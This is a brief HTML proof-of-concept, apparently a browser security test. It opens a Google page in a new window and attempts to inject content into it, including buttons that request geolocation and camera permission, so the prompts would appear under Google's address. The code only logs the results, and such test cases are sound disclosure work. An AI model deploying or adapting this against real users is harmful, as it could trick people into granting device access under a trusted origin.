<!DOCTYPE html>
<html>
<body>
<button onclick="go()">go</button>

<script>
function go() {
  var x = window.open('https://www.google.com/csi');

  setTimeout(function () {
    try {
      x.document.body.innerHTML = `
        <h1>Browser UI Trust Test</h1>
        <p>
          Address bar shows:
          <b>${x.location.href}</b>
        </p>

        <p>
          The content below was injected via DOM manipulation.
        </p>

        <button onclick="requestLocation()">Request Location</button>
        <button onclick="requestCamera()">Request Camera</button>

        <pre id="log"></pre>

        <script>
          function log(msg) {
            document.getElementById('log').textContent += msg + "\\n";
          }

          function requestLocation() {
            if (!navigator.geolocation) {
              log("Geolocation not supported");
              return;
            }
            navigator.geolocation.getCurrentPosition(
              () => log("Geolocation permission GRANTED"),
              (e) => log("Geolocation denied: " + e.message)
            );
          }

          function requestCamera() {
            if (!navigator.mediaDevices) {
              log("Camera API not supported");
              return;
            }
            navigator.mediaDevices.getUserMedia({ video: true })
              .then(() => log("Camera permission GRANTED"))
              .catch(e => log("Camera denied: " + e.name));
          }
        <\/script>
      `;
    } catch (e) {
      console.log(e);
    }
  }, 3000);
}
</script>
</body>
</html>
